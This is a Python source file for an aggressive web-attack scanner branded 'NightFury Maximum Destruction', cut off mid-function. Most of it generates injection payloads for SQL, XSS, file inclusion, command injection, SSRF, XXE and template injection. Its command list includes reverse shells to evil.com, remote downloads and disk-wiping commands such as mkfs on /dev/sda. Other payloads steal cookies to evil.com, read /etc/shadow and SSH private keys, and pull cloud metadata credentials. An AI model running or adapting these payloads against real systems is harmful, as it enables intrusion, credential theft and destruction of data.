#!/usr/bin/env python3
# NIGHTFURY MAXIMUM DESTRUCTION v5.0
# INDUSTRIAL GRADE - 50+ METHODS - ZERO ERROR

import os
import sys
import time
import json
import random
import socket
import struct
import base64
import hashlib
import urllib3
import requests
import threading
import subprocess
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urljoin, quote, unquote
from collections import defaultdict

# Suppress warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Color system dengan fallback
try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
except:
    class Fore:
        BLACK = '\033[30m'; RED = '\033[31m'; GREEN = '\033[32m'
        YELLOW = '\033[33m'; BLUE = '\033[34m'; MAGENTA = '\033[35m'
        CYAN = '\033[36m'; WHITE = '\033[37m'; RESET = '\033[39m'
    class Back:
        BLACK = '\033[40m'; RED = '\033[41m'; GREEN = '\033[42m'
        YELLOW = '\033[43m'; BLUE = '\033[44m'; MAGENTA = '\033[45m'
        CYAN = '\033[46m'; WHITE = '\033[47m'; RESET = '\033[49m'
    class Style:
        BRIGHT = '\033[1m'; DIM = '\033[2m'; NORMAL = '\033[22m'
        RESET_ALL = '\033[0m'


class NightFuryMaximum:
    """INDUSTRIAL GRADE SCANNER - 50+ METHODS"""
    
    def __init__(self):
        self.target = ""
        self.base_url = ""
        self.domain = ""
        self.ip = ""
        self.session = requests.Session()
        self.session.verify = False
        self.session.timeout = 15
        self.max_threads = 20
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0'
        ]
        self.headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }
        self.vulnerabilities = []
        self.endpoints = []
        self.forms = []
        self.parameters = []
        self.tech_stack = {}
        self.start_time = time.time()
        self.request_count = 0
        self.error_count = 0
        
    # ==================== CORE FUNCTIONS ====================
    
    def _get_deep_payloads(self, category):
        payloads = set()
        
        if category == 'sqli_error':
            bases = ["'", "\"", "')", "\"))", "1'", "1\"", "admin'", "test'", "user'", "''", "\"\"", "') ", "\")) ", "1' ", "' OR ", "\" OR ", "') OR ", "' AND ", "\" AND ", "') AND "]
            ops = ["OR", "AND", "OR", "OR", "AND", "UNION ALL SELECT", "UNION SELECT", "UNION", "WHERE", "HAVING"]
            conditions = ["1=1", "'1'='1'", "\"1\"=\"1\"", "1=2", "'a'='a'", "7=7", "1=1", "2=2", "99=99", "'x'='x'", "NULL IS NULL", "NOT NULL", "1<>2", "2>1"]
            comments = ["--", "-- ", "#", "/*", ";%00", "-- -", "--+", "/*!", "*/", " %00"]
            whitespaces = [" ", "/**/", "%09", "%0a", "%0b", "%0c", "%0d", "+", "%20", "\t"]
            functions = ["CONCAT(0x41,0x42)", "VERSION()", "DATABASE()", "USER()", "@@version", "CURRENT_USER()", "NOW()", "RAND()", "UUID()", "BENCHMARK(1,1)", "SLEEP(0)", "MD5(1)", "PASSWORD('1')", "LOAD_FILE(0x2f6574632f706173737764)"]
            
            while len(payloads) < 200:
                b = random.choice(bases)
                o = random.choice(ops)
                c = random.choice(conditions)
                cm = random.choice(comments)
                w = random.choice(whitespaces)
                f = random.choice(functions)
                
                r = random.random()
                if r < 0.15:
                    p = f"{b}{w}{o}{w}{c}{w}{cm}"
                elif r < 0.25:
                    p = f"{b}{w}{o}{w}{f}{w}{cm}"
                elif r < 0.35:
                    p = f"{b}{w}{o}{w}{c}{w}{o}{w}{c}{w}{cm}"
                elif r < 0.50 and "UNION" in o:
                    cols_count = random.randint(1, 25)
                    cols = ",".join([f"{f}" if random.random() > 0.5 else "NULL" for _ in range(cols_count)])
                    p = f"{b}{w}{o}{w}{cols}{w}{cm}"
                elif r < 0.65:
                    p = f"{b}{w}{o}{w}{c}{w}/*{w}{c}{w}*/{w}{cm}"
                elif r < 0.80:
                    p = f"{b}{w}{o}{w}EXISTS({w}SELECT{w}{c}){w}{cm}"
                else:
                    p = f"{b}{w}{o}{w}{c}{w}{o}{w}{f}{w}{cm}"
                payloads.add(p)
                
        elif category == 'sqli_time':
            db_sleep = [
                "' OR SLEEP(5)--", "' OR SLEEP(3)--", "' OR SLEEP(7)--",
                "1' AND SLEEP(5)--", "1' AND SLEEP(3)--", "1' AND SLEEP(7)--",
                "'; WAITFOR DELAY '00:00:05'--", "1'; WAITFOR DELAY '00:00:05'--",
                "'; WAITFOR DELAY '00:00:03'--", "1'; WAITFOR DELAY '00:00:07'--",
                "' OR pg_sleep(5)--", "1' AND pg_sleep(5)--", "' OR pg_sleep(3)--",
                "' OR BENCHMARK(5000000,MD5(1))--", "1' AND BENCHMARK(5000000,MD5(1))--",
                "' OR BENCHMARK(10000000,SHA1(1))--", "' OR BENCHMARK(25000000,AES_ENCRYPT(1,1))--",
                "1' AND BENCHMARK(5000000,SHA2(1,256))--",
                "' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "' OR (SELECT * FROM (SELECT(SLEEP(3)))a)--",
                "1' OR (SELECT * FROM (SELECT(SLEEP(5)))b)--",
                "'; EXEC xp_cmdshell 'ping 127.0.0.1 -n 5'--",
                "' OR IF(1=1,SLEEP(5),0)--", "1' AND IF(1=1,SLEEP(5),0)--",
                "' OR IF(1=1,pg_sleep(5),0)--", "1' AND IF(1=1,pg_sleep(5),0)--",
                "'; SELECT SLEEP(5);--", "\" OR SLEEP(5)--", "\" AND SLEEP(5)--",
                "') OR SLEEP(5)--", "') AND SLEEP(5)--",
                "'; SLEEP(5);--", "1'; SLEEP(5);--",
                "' OR dbms_lock.sleep(5)--", "1' AND dbms_lock.sleep(5)--",
                "'; dbms_lock.sleep(5);--", "1'; dbms_lock.sleep(5);--",
                "'; EXECUTE IMMEDIATE 'SELECT BENCHMARK(10000000,MD5(1))'--",
                "' OR (SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B)--",
                "1' OR (SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B)--",
                "') OR SLEEP(5)#", "') AND SLEEP(5)#",
                "') WAITFOR DELAY '00:00:05'--", "') WAITFOR DELAY '00:00:05'#",
                "')) OR SLEEP(5)--", "')) AND SLEEP(5)--",
                "1')); WAITFOR DELAY '00:00:05'--", "')); WAITFOR DELAY '00:00:05'--",
                "1' OR SLEEP(5) AND '1'='1", "1' OR SLEEP(5) AND '1'='2",
                "1' OR pg_sleep(5) AND '1'='1", "' UNION SELECT SLEEP(5)--",
                "' UNION SELECT NULL,SLEEP(5)--", "' UNION SELECT NULL,NULL,SLEEP(5)--",
                "admin' OR SLEEP(5)--", "admin' WAITFOR DELAY '00:00:05'--",
                "' OR pg_sleep(5)-- -", "' OR pg_sleep(5)#",
                "1' OR pg_sleep(5)-- -", "1' OR pg_sleep(5)#",
            ]
            db_test = [
                "' OR SLEEP(5)--", "' OR SLEEP(3)--", "' OR SLEEP(7)--",
                "1' AND SLEEP(5)--", "1' AND SLEEP(3)--",
                "'; WAITFOR DELAY '00:00:05'--", "1'; WAITFOR DELAY '00:00:05'--",
                "' OR pg_sleep(5)--", "1' AND pg_sleep(5)--",
                "' OR BENCHMARK(5000000,MD5(1))--", "1' AND BENCHMARK(5000000,MD5(1))--",
                "' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "1' OR (SELECT * FROM (SELECT(SLEEP(5)))b)--",
                "' OR IF(1=1,SLEEP(5),0)--", "1' AND IF(1=1,SLEEP(5),0)--",
                "\" OR SLEEP(5)--", "') OR SLEEP(5)--",
                "' OR dbms_lock.sleep(5)--", "1' AND dbms_lock.sleep(5)--",
                "') OR SLEEP(5)#", "')) OR SLEEP(5)--",
                "1' OR pg_sleep(5)-- -", "' UNION SELECT SLEEP(5)--",
            ]
            for p in db_sleep:
                payloads.add((p, 4))
            for p in db_test:
                payloads.add((p, 4))
            while len(payloads) < 50:
                p = random.choice(db_sleep)
                payloads.add((p[0] if isinstance(p, tuple) else p, 4))
            
        elif category == 'sqli_boolean':
            true_payloads = [
                "' AND '1'='1", "' AND 1=1", "' AND 'a'='a", "' AND 7=7",
                "\" AND \"1\"=\"1", "\" AND 1=1", "1 AND 1=1", "' OR '1'='1'--",
                "' OR 1=1--", "' OR 'a'='a'--", "') AND '1'='1", "') AND 1=1",
                "\") AND \"1\"=\"1", "') OR '1'='1'--", "') OR 1=1--",
                "' AND '1'='1'--", "\" AND \"1\"=\"1\"--", "1' AND '1'='1",
                "1' AND 1=1", "1\" AND \"1\"=\"1", "1 AND 1=1--",
                "' OR '1'='1'#", "' OR 1=1#", "' OR 'a'='a'#",
                "1' AND '1'='1'--", "1' AND 1=1--", "' AND 1=1#",
                "' AND '1'='1'/*", "' OR '1'='1'/*", "1' OR 1=1/*",
                "' AND SLEEP(0)--", "1' AND BENCHMARK(1,1)--",
                "' OR 1=1 LIMIT 1--", "' OR 1=1 GROUP BY 1--",
                "') OR ('1'='1", "') OR (1=1)", "')) OR (('1'='1",
                "1' OR '1'='1", "1' OR 1=1", "1' OR '1'='1'--",
                "\"' OR '1'='1", "1\" OR \"1\"=\"1", "admin' OR '1'='1'--",
                "test' OR '1'='1'--", "user' OR '1'='1'--",
            ]
            false_payloads = [
                "' AND '1'='2", "' AND 1=2", "' AND 'a'='b", "' AND 8=9",
                "\" AND \"1\"=\"2", "\" AND 1=2", "1 AND 1=2", "' OR '1'='2'--",
                "' OR 1=2--", "' OR 'a'='b'--", "') AND '1'='2", "') AND 1=2",
                "\") AND \"1\"=\"2", "') OR '1'='2'--", "') OR 1=2--",
                "' AND '1'='2'--", "\" AND \"1\"=\"2\"--", "1' AND '1'='2",
                "1' AND 1=2", "1\" AND \"1\"=\"2", "1 AND 1=2--",
                "' OR '1'='2'#", "' OR 1=2#", "' OR 'a'='b'#",
                "1' AND '1'='2'--", "1' AND 1=2--", "' AND 1=2#",
                "' AND '1'='2'/*", "' OR '1'='2'/*", "1' OR 1=2/*",
                "' OR 1=2 LIMIT 1--", "' OR 1=2 GROUP BY 1--",
                "') OR ('1'='2", "') OR (1=2)", "')) OR (('1'='2",
                "1' OR '1'='2", "1' OR 1=2", "1' OR '1'='2'--",
                "\"' OR '1'='2", "1\" OR \"1\"=\"2", "admin' OR '1'='2'--",
                "test' OR '1'='2'--", "user' OR '1'='2'--",
            ]
            while len(payloads) < 200:
                i = random.randint(0, len(true_payloads)-1)
                payloads.add((true_payloads[i], false_payloads[i % len(false_payloads)]))
                
        elif category == 'sqli_union':
            bases = ["'", "\"", "')", "\"))", "1'", "1\"", "admin'", "''", "\"\"", "') "]
            for b in bases:
                for col_count in range(1, 26):
                    cols = ",".join(["NULL"] * col_count)
                    payloads.add(f"{b} UNION SELECT {cols}--")
                    payloads.add(f"{b} UNION ALL SELECT {cols}--")
                    payloads.add(f"{b} UNION SELECT {cols}#")
                    payloads.add(f"{b} UNION ALL SELECT {cols}#")
                    payloads.add(f"{b} UNION SELECT {cols}/*")
                    payloads.add(f"{b} UNION ALL SELECT {cols}/*")
                    if col_count >= 2:
                        vals = ",".join([f"{random.choice(['1','2','3','4','5','6','7','8','9'])}" for _ in range(col_count)])
                        payloads.add(f"{b} UNION SELECT {vals}--")
                        payloads.add(f"{b} UNION SELECT {vals}#")
            for b in bases:
                for col_count in range(2, 12):
                    rand_cols = ",".join([f"NULL"] * col_count)
                    payloads.add(f"{b} UNION SELECT {rand_cols} FROM information_schema.tables--")
                    payloads.add(f"{b} UNION SELECT {rand_cols} FROM mysql.user--")
                    payloads.add(f"{b} UNION SELECT {rand_cols} FROM pg_catalog.pg_tables--")
                    payloads.add(f"{b} UNION SELECT {rand_cols} FROM all_tables--")
            while len(payloads) < 200:
                b = random.choice(bases)
                col_count = random.randint(1, 30)
                cols = ",".join(["NULL"] * col_count)
                payloads.add(f"{b} UNION SELECT {cols}--")
                
        elif category == 'xss':
            tags = ["script", "img", "svg", "body", "iframe", "input", "details", "video", "audio", "marquee", "isindex", "keygen", "object", "embed", "style", "link", "table", "div", "span", "a", "p", "br", "hr", "meta", "base", "form", "button", "select", "textarea", "title", "frameset", "frame", "layer", "ilayer", "bgsound", "meta", "isindex", "listing", "xmp", "noscript"]
            events = ["onload", "onerror", "onfocus", "onmouseover", "ontoggle", "onstart", "onclick", "onscroll", "onblur", "onchange", "onsubmit", "onreset", "onselect", "onabort", "onkeydown", "onkeypress", "onkeyup", "onmouseout", "onmouseenter", "onmouseleave", "ondblclick", "onresize", "onpageshow", "onunload", "onbeforeunload", "onstorage", "onpopstate", "onhashchange", "ononline", "onoffline", "onwaiting", "onplay", "onpause", "oncanplay", "onprogress", "onsuspend", "onemptied", "onstalled", "onseeking", "onseeked", "ontimeupdate", "ondurationchange", "onratechange", "onvolumechange", "oncuechange", "ontoggle"]
            js_actions = ["alert(1)", "confirm(1)", "prompt(1)", "fetch('//evil.com')", "eval(atob('YWxlcnQoMSk='))", "alert(document.domain)", "confirm(document.cookie)", "prompt(document.URL)", "eval('alert(1)')", "console.log(1)", "throw new Error(1)", "open('//evil.com')", "location='//evil.com'", "document.location='//evil.com'", "window.name='xss'", "new Image().src='//evil.com/'+document.cookie", "XMLHttpRequest`open``send`", "setTimeout('alert(1)')", "setInterval('alert(1)')", "String.fromCharCode(97,108,101,114,116,40,49,41)", "atob('YWxlcnQoMSk=')", "eval.call(null,'alert(1)')", "Function('alert(1)')()", "constructor.constructor('alert(1)')()"]
            encodings = ["", "javascript:", "vbscript:", "JAVASCRIPT:", "VBSCRIPT:", "JavaScripT:", "java%0ascript:", "java\tascript:", "java\nscript:"]
            prefixes = ["", "';", "\";", "';alert(1);';", "\";alert(1);\";", "<!--", "--!>", "<![CDATA[", "]]>"]
            suffixes = ["", "//", "<!--", "-->", "'';alert(1);''", "\"\";alert(1);\"\""]
            
            while len(payloads) < 200:
                t = random.choice(tags)
                e = random.choice(events)
                a = random.choice(js_actions)
                enc = random.choice(encodings)
                pref = random.choice(prefixes)
                suff = random.choice(suffixes)
                
                r = random.random()
                if t == "script":
                    if r < 0.3:
                        p = f"<{t}>{a}</{t}>"
                    elif r < 0.5:
                        p = f"<{t} defer>{a}</{t}>"
                    elif r < 0.7:
                        p = f"<{t} async>{a}</{t}>"
                    elif r < 0.85:
                        p = f"<{t} src=data:text/javascript,{a}></{t}>"
                    else:
                        p = f"<{t}>{pref}{a}{suff}</{t}>"
                elif t in ["img", "video", "audio", "input", "embed", "source", "track"]:
                    if r < 0.3:
                        p = f"<{t} src=x {e}={a}>"
                    elif r < 0.5:
                        p = f"<{t} src=x {e}=eval(atob('YWxlcnQoMSk='))>"
                    elif r < 0.7:
                        p = f"<{t} src=\"\" {e}={a}>"
                    else:
                        p = f"<{t} src=1 {e}={a} x=>"
                elif t == "details":
                    p = f"<{t} open {e}={a}>"
                elif t == "marquee":
                    p = f"<{t} {e}={a}>"
                elif t in ["body", "frameset", "style"]:
                    p = f"<{t} {e}={a}>"
                elif t == "a":
                    if r < 0.3:
                        p = f"<a href={enc}{a}>click</a>"
                    elif r < 0.5:
                        p = f"<a href=\"{enc}{a}\">click</a>"
                    else:
                        p = f"<a href='{enc}{a}'>click</a>"
                elif t in ["table", "td", "tr"]:
                    p = f"<table background=\"{enc}{a}\">"
                elif t in ["div", "span", "p"]:
                    p = f"<div style=\"background-image:url({enc}{a})\">"
                elif t == "form":
                    p = f"<form><button formaction={enc}{a}>X</button></form>"
                elif t == "object":
                    p = f"<object data=\"{enc}{a}\">"
                elif t in ["keygen", "isindex"]:
                    p = f"<{t} {e}={a}>"
                elif t == "meta":
                    p = f"<meta http-equiv=\"refresh\" content=\"0;url={enc}{a}\">"
                else:
                    p = f"<{t} {e}={a}>"
                
                if random.random() > 0.6:
                    p = p.replace(" ", "/**/")
                if random.random() > 0.85:
                    p = p.upper() if random.random() > 0.5 else p.lower()
                if random.random() > 0.9:
                    p = f"\"'><{p}"
                payloads.add(p)

        elif category == 'lfi':
            traversals = ["../", "..\\", "..;/", "....//", "....\\\\", "%2e%2e%2f", "%252e%252e%252f", "..%252f", "..%c0%af", "..%ef%bc%8f", "..%e0%80%af", "..%c1%9c"]
            prefixes = ["", "/", "file://", "php://filter/convert.base64-encode/resource=", "php://filter/string.rot13/resource=", "php://filter/zlib.deflate/resource="]
            linux_files = ["etc/passwd", "etc/shadow", "etc/hosts", "etc/group", "etc/issue", "etc/motd", "etc/bashrc", "etc/profile", "etc/crontab", "etc/fstab", "etc/resolv.conf", "etc/sudoers", "etc/ssh/sshd_config", "etc/mysql/my.cnf", "etc/php.ini", "etc/nginx/nginx.conf", "etc/apache2/apache2.conf", "etc/httpd/conf/httpd.conf", "proc/self/environ", "proc/self/status", "proc/self/cmdline", "proc/self/mounts", "proc/self/fd/0", "proc/self/fd/1", "proc/self/fd/2", "proc/version", "proc/cpuinfo", "proc/meminfo", "proc/net/tcp", "var/log/apache2/access.log", "var/log/apache2/error.log", "var/log/httpd/access_log", "var/log/httpd/error_log", "var/log/nginx/access.log", "var/log/nginx/error.log", "var/log/auth.log", "var/log/syslog", "var/log/messages", "var/log/dpkg.log", "var/log/kern.log", "var/log/mysql/error.log", "var/www/html/index.php", "var/www/html/config.php", "home/www/html/wp-config.php", "home/ubuntu/.ssh/id_rsa", "root/.bashrc", "root/.ssh/id_rsa", "opt/lampp/etc/passwd", "usr/local/etc/php.ini"]
            windows_files = ["windows/win.ini", "windows/system.ini", "windows/system32/drivers/etc/hosts", "windows/system32/config/sam", "windows/repair/sam", "windows/repair/system", "windows/regedit.exe", "boot.ini", "autoexec.bat", "windows/php.ini", "windows/system32/license.rtf", "Program Files/Apache Group/Apache/conf/httpd.conf", "Program Files/MySQL/MySQL Server 5.5/my.ini", "Program Files/FileZilla Server/FileZilla Server.xml"]
            suffixes = ["", "%00", ".jpg", "\0", ".php", ".html", ".txt", ".php%00", ".jpg%00", ".php\x00", "%2500", "?", "%3f", ".%00", "/%00"]
            
            while len(payloads) < 200:
                t = random.choice(traversals) * random.randint(2, 20)
                f = random.choice(linux_files + windows_files)
                s = random.choice(suffixes)
                p = random.choice(prefixes)
                
                r = random.random()
                if r < 0.15:
                    payloads.add(f"{p}{t}{f}{s}")
                elif r < 0.30:
                    payloads.add(f"{p}{t}{f}")
                elif r < 0.45:
                    payloads.add(f"/{t}{f}{s}")
                elif r < 0.60:
                    payloads.add(f"/{t}{f}")
                elif r < 0.75:
                    payloads.add(f"{p}{t}{f}{s}%23")
                else:
                    deep_t = random.choice(traversals) * random.randint(5, 25)
                    payloads.add(f"{p}{deep_t}{f}{s}")
                
        elif category == 'cmdi':
            separators = [";", "|", "&", "||", "&&", "`", "$(", "\n", "%0a", "; ", "| ", "& "] 
            linux_cmds = ["echo vulnerable", "id", "whoami", "uname -a", "cat /etc/passwd", "pwd", "ls -la", "hostname", "ifconfig", "wget http://evil.com/shell", "curl http://evil.com", "nc -e /bin/sh evil.com 4444", "bash -i >& /dev/tcp/evil.com/4444 0>&1", "python -c 'import socket;s=socket.socket();s.connect((\"evil.com\",4444))'", "perl -e 'use Socket;$i=\"evil.com\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)))'", "php -r '$s=fsockopen(\"evil.com\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'", "ruby -rsocket -e 'c=TCPSocket.new(\"evil.com\",4444);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'", "cat /etc/shadow", "find / -name *.php", "ps aux", "netstat -an", "nslookup google.com", "ping -c 5 127.0.0.1", "sleep 5", "echo $(whoami)", "echo `whoami`", "expr 1 + 1", "kill -9 1", "reboot", "shutdown -r now", "chmod 777 /etc/shadow", "dd if=/dev/zero of=/dev/mem", "mkfs.ext4 /dev/sda"]
            windows_cmds = ["dir", "type C:\\windows\\win.ini", "ipconfig", "systeminfo", "whoami", "net user", "net localgroup administrators", "tasklist", "ver", "echo vulnerable", "cmd /c dir", "powershell -c Get-Process", "powershell -c Get-Service", "powershell -c Invoke-Expression('echo vulnerable')", "cscript", "wscript", "mshta", "reg query HKLM", "netstat -an", "ping -n 5 127.0.0.1", "tracert google.com", "nslookup google.com", "timeout 5"]
            cmdi_payloads = set()
            
            for sep in separators:
                for cmd in linux_cmds + windows_cmds:
                    if sep in ["`", "$("]:
                        p = f"{sep}{cmd}{'`' if sep == '`' else ')'}"
                    elif sep == "\n":
                        p = f"{sep}{cmd}"
                    elif sep == "%0a":
                        p = f"{sep}{cmd}"
                    else:
                        p = f"{sep} {cmd}"
                    cmdi_payloads.add(p)
            
            while len(payloads) < 200:
                s = random.choice(separators)
                c = random.choice(linux_cmds + windows_cmds)
                if s in ["`", "$("]:
                    p = f"{s}{c}{'`' if s == '`' else ')'}"
                elif s in ["\n", "%0a"]:
                    p = f"{s}{c}"
                else:
                    p = f"{s} {c}"
                payloads.add(p)
                
        elif category == 'cmdi_time':
            for sep in [";", "|", "&", "||", "&&", "`", "$("]:
                for cmd in ["sleep 5", "ping -c 5 127.0.0.1", "timeout 5"]:
                    if sep in ["`", "$("]:
                        p = f"{sep}{cmd}{'`' if sep == '`' else ')'}"
                    else:
                        p = f"{sep} {cmd}"
                    payloads.add((p, 4))
            while len(payloads) < 50:
                s = random.choice([";", "|", "&", "||", "&&", "`", "$("])
                c = random.choice(["sleep 5", "ping -c 5 127.0.0.1", "timeout 5", "ping -n 5 127.0.0.1", "sleep 3", "sleep 7"])
                if s in ["`", "$("]:
                    p = f"{s}{c}{'`' if s == '`' else ')'}"
                else:
                    p = f"{s} {c}"
                payloads.add((p, 4))
                
        elif category == 'ssrf':
            internal_ips = [
                "http://127.0.0.1:", "http://localhost:", "http://0.0.0.0:",
                "http://[::1]:", "http://10.", "http://172.16.", "http://172.17.", "http://172.18.", "http://172.19.", "http://172.20.", "http://172.21.", "http://172.22.", "http://172.23.", "http://172.24.", "http://172.25.", "http://172.26.", "http://172.27.", "http://172.28.", "http://172.29.", "http://172.30.", "http://172.31.", "http://192.168.",
                "http://169.254.169.254", "http://metadata.google.internal", "http://100.100.100.200",
                "http://metadata.tencentyun.com", "http://169.254.169.250", "http://169.254.169.251",
                "http://2130706433/", "http://0x7f000001/", "http://0177.0.0.1/",
                "http://127.0.0.2:", "http://127.0.0.3:", "http://127.0.0.4:", "http://127.0.0.5:",
            ]
            ports = [22, 80, 443, 3306, 5432, 6379, 8080, 8443, 9200, 11211, 27017, 21, 25, 53, 110, 143, 993, 135, 139, 445, 1433, 1521, 2049, 3389, 5900, 5984, 6667, 9092, 9418, 50000]
            protocols = ["http://", "https://", "gopher://", "dict://", "ftp://", "file://", "ldap://"]
            cloud_endpoints = [
                "http://169.254.169.254/latest/meta-data/", "http://169.254.169.254/latest/user-data/",
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "http://169.254.169.254/latest/meta-data/public-keys/",
                "http://169.254.169.254/latest/meta-data/placement/availability-zone/",
                "http://metadata.google.internal/computeMetadata/v1/",
                "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
                "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/",
                "http://metadata.google.internal/computeMetadata/v1/project/project-id",
                "http://100.100.100.200/latest/meta-data/",
                "http://100.100.100.200/latest/user-data/",
                "http://169.254.169.254/metadata/instance?api-version=2017-08-01",
            ]
            
            for ip in internal_ips:
                for port in random.sample(ports, 10):
                    payloads.add(f"{ip}{port}")
            for ep in cloud_endpoints:
                payloads.add(ep)
            for proto in protocols:
                for ip in ["127.0.0.1", "localhost", "0.0.0.0"]:
                    for port in random.sample(ports, 5):
                        payloads.add(f"{proto}{ip}:{port}")
            while len(payloads) < 200:
                ip = random.choice(internal_ips)
                port = random.choice(ports)
                payloads.add(f"{ip}{port}")
                
        elif category == 'xxe':
            dtds = [
                ('file:///etc/passwd', 'read'),
                ('php://filter/convert.base64-encode/resource=/etc/passwd', 'read'),
                ('http://127.0.0.1:80/', 'http'),
                ('http://localhost:8080/', 'http'),
                ('ftp://localhost:21/', 'ftp'),
                ('gopher://localhost:8080/', 'gopher'),
                ('expect://ls', 'exec'),
            ]
            entities = ["test", "xxe", "data", "file", "evil", "pwn", "x1", "x2", "x3", "d1", "d2", "e1", "e2"]
            
            while len(payloads) < 200:
                e = random.choice(entities)
                uri, etype = random.choice(dtds)
                r = random.random()
                if r < 0.35:
                    p = f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY {e} SYSTEM "{uri}">]><root>&{e};</root>'
                elif r < 0.55:
                    p = f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % {e} SYSTEM "{uri}">%{e};]><root>test</root>'
                elif r < 0.70:
                    p = f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY {e} SYSTEM "{uri}">]><r>&{e};</r>'
                elif r < 0.85:
                    p = f'<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY {e} SYSTEM "{uri}">]><root><data>&{e};</data></root>'
                else:
                    e2 = random.choice(entities)
                    while e2 == e:
                        e2 = random.choice(entities)
                    p = f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % {e} SYSTEM "{uri}"><!ENTITY {e2} "%{e};">]><root>&{e2};</root>'
                payloads.add(p)
                
        elif category == 'ssti':
            tests = [
                ("{{7*7}}", "49"), ("${7*7}", "49"), ("{{7*'7'}}", "7777777"),
                ("<%= 7*7 %>", "49"), ("{{config}}", "config"), ("{{self}}", "self"),
                ("{{request}}", "request"), ("{{_self}}", "_self"),
                ("{{7*7}}", "49"), ("${7*7}", "49"), ("{{7*'7'}}", "7777777"),
                ("{{7^7}}", "0"), ("${7^7}", "0"), ("{{7+7}}", "14"),
                ("{{7-7}}", "0"), ("{{7/7}}", "1"), ("{{7*7}}", "49"),
            ]
            for t, e in tests:
                payloads.add((t, e))
            jinja2 = [
                ("{{7*7}}", "49"), ("{{7*'7'}}", "7777777"), ("{{config}}", "config"),
                ("{{request}}", "request"), ("{{self.__class__.__mro__}}", "__mro__"),
                ("{{''.__class__.__mro__}}", "__mro__"), ("{{()|attr('__class__')}}", "__class__"),
                ("{{lipsum|attr('__globals__')}}", "__globals__"),
                ("{{cycler|attr('__init__')|attr('__globals__')}}", "__globals__"),
                ("{{joiner|attr('__init__')|attr('__globals__')}}", "__globals__"),
                ("{{namespace|attr('__init__')|attr('__globals__')}}", "__globals__"),
                ("{{config|attr('from_envvar')}}", "from_envvar"),
                ("{{request|attr('application')}}", "application"),
                ("{{request.environ}}", "environ"),
                ("{{app=request.application}}", "application"),
            ]
            for t, e in jinja2:
                payloads.add((t, e))
            twig = [("{{7*7}}", "49"), ("{{_self.env.registerUndefinedFilterCallback('exec')}}", "registerUndefinedFilterCallback")]
            for t, e in twig:
                payloads.add((t, e))
            mako = [("${7*7}", "49"), ("${self.__class__.__mro__}", "__mro__"), ("${self.module.cache.__class__}", "__class__")]
            for t, e in mako:
                payloads.add((t, e))
            smarty = [("{7*7}", "49"), ("{$smarty.version}", "smarty"), ("{php}echo 49;{/php}", "49")]
            for t, e in smarty:
                payloads.add((t, e))
            while len(payloads) < 200:
                t, e = random.choice(tests)
                payloads.add((t, e))
                
        elif category == 'open_redirect':
            urls = [
                "http://evil.com", "https://evil.com", "//evil.com",
                "http://evil.com/", "https://evil.com/", "//evil.com/",
                "http://evil.com:8080", "https://evil.com:8443", "//evil.com:8080",
                "https://evil.com@google.com", "http://evil.com@google.com",
                "https://google.com.evil.com", "http://google.com.evil.com",
                "https://evil.com%2Fgoogle.com", "http://evil.com%2Fgoogle.com",
                "////evil.com", "/////evil.com", "//////evil.com",
                "https://evil.com.evil.net", "http://evil.com.evil.net",
                "https://evil.com/google.com", "http://evil.com/google.com",
                "https:evil.com", "http:evil.com", "javascript:alert(1)",
                "data:text/html,<script>alert(1)</script>",
                "vbscript:msgbox(1)", "file:///etc/passwd",
                "ftp://evil.com", "gopher://evil.com:8080",
                "//evil.com@google.com", "///evil.com",
                "http://127.0.0.1:80", "http://localhost:80",
                "https://evil.com%2F%2Fgoogle.com",
                "https://evil.com\\@google.com",
                "https://evil.com:443@google.com:443",
                "http://evil\\@google.com",
                "//evil.com@localhost",
                "http://[::1]:80", "http://0x7f000001:80",
                "http://2130706433:80", "http://0177.0.0.1:80",
                "//10.0.0.1", "//192.168.1.1", "//172.16.0.1",
                "https://evil.com?goto=http://evil.com",
                "https://evil.com#http://evil.com",
                "https://evil.com/redirect?url=http://evil.com",
            ]
            for u in urls:
                payloads.add(u)
            while len(payloads) < 200:
                payloads.add(random.choice(urls))

        return sorted(list(payloads)) if category not in ['sqli_time', 'sqli_boolean', 'cmdi_time', 'ssti'] else list(payloads)

    def random_ua(self):
        """Random User-Agent"""
        return random.choice(self.user_agents)
    
    def request(self, url, method='GET', params=None, data=None, headers=None, 
                cookies=None, allow_redirects=True, timeout=15):
        """Universal request handler dengan error handling"""
        result = {'success': False, 'response': None, 'error': None}
        
        try:
            req_headers = self.headers.copy()
            req_headers['User-Agent'] = self.random_ua()
            if headers:
                req_headers.update(headers)
            
            self.request_count += 1
            
            if method.upper() == 'GET':
                r = self.session.get(
